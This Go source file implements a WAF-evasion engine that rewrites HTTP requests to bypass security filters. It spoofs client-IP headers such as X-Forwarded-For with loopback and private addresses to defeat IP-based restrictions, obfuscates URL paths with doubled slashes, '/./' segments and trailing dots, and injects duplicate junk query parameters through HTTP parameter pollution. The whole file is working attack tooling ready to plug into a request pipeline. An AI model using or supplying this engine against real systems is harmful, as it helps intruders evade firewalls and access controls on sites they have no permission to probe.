package evasion

import (
	"math/rand"
	"net/http"
	"net/url"
	"strings"
	"time"
)

// EvasionEngine provides common WAF bypass techniques algorithmically.
type EvasionEngine struct {
	rnd *rand.Rand
}

// NewEvasionEngine initializes the evasion toolset.
func NewEvasionEngine() *EvasionEngine {
	return &EvasionEngine{
		rnd: rand.New(rand.NewSource(time.Now().UnixNano())),
	}
}

// ApplyAll applies a random selection of WAF evasion techniques to an HTTP Request.
// It modifies the request in place.
func (e *EvasionEngine) ApplyAll(req *http.Request) {
	e.SpoofHeaders(req)
	e.NormalizePath(req)
	e.PolluteParameters(req)
}

// SpoofHeaders injects common headers known to bypass IP or Proxy restrictions in older WAFs.
func (e *EvasionEngine) SpoofHeaders(req *http.Request) {
	// Common local/internal IPs used to bypass restrictions
	spoofedIPs := []string{"127.0.0.1", "10.0.0.1", "192.168.0.1", "172.16.0.1", "localhost"}
	ip := spoofedIPs[e.rnd.Intn(len(spoofedIPs))]

	headers := map[string]string{
		"X-Forwarded-For":       ip,
		"X-Originating-IP":      ip,
		"X-Remote-IP":           ip,
		"X-Remote-Addr":         ip,
		"X-Client-IP":           ip,
		"X-Host":                ip,
		"X-Forwarded-Host":      ip,
		"X-Custom-IP-Authorization": ip,
	}

	for k, v := range headers {
		if req.Header.Get(k) == "" {
			req.Header.Set(k, v)
		}
	}
}

// NormalizePath modifies the URL path to trick regex-based WAFs.
// E.g. /api/users -> /api/./users or /api//users
func (e *EvasionEngine) NormalizePath(req *http.Request) {
	path := req.URL.Path
	if path == "" || path == "/" {
		return
	}

	techniques := []func(string) string{
		func(p string) string { return strings.ReplaceAll(p, "/", "//") },
		func(p string) string { return strings.ReplaceAll(p, "/", "/./") },
		// Adding a trailing dot (works against some reverse proxies)
		func(p string) string { 
			if !strings.HasSuffix(p, "/") {
				return p + "."
			}
			return p
		},
	}

	// Pick a random technique
	tech := techniques[e.rnd.Intn(len(techniques))]
	req.URL.Path = tech(path)
}

// PolluteParameters implements HTTP Parameter Pollution (HPP).
// It takes existing query parameters and injects identical keys with safe/junk data
// to confuse WAF parsers that only look at the first or last instance of a parameter.
func (e *EvasionEngine) PolluteParameters(req *http.Request) {
	if req.URL.RawQuery == "" {
		// If no query, just add some junk to fingerprint/bypass caches
		req.URL.RawQuery = "cb=" + randomString(8)
		return
	}

	values, err := url.ParseQuery(req.URL.RawQuery)
	if err != nil {
		return
	}

	// For every existing parameter, add a duplicate with junk
	for key := range values {
		values.Add(key, "junk_"+randomString(4))
	}

	req.URL.RawQuery = values.Encode()
}

func randomString(n int) string {
	letters := []rune("abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789")
	b := make([]rune, n)
	for i := range b {
		// e.rnd isn't globally accessible here without passing it, using global rand for simplicity
		b[i] = letters[rand.Intn(len(letters))]
	}
	return string(b)
}
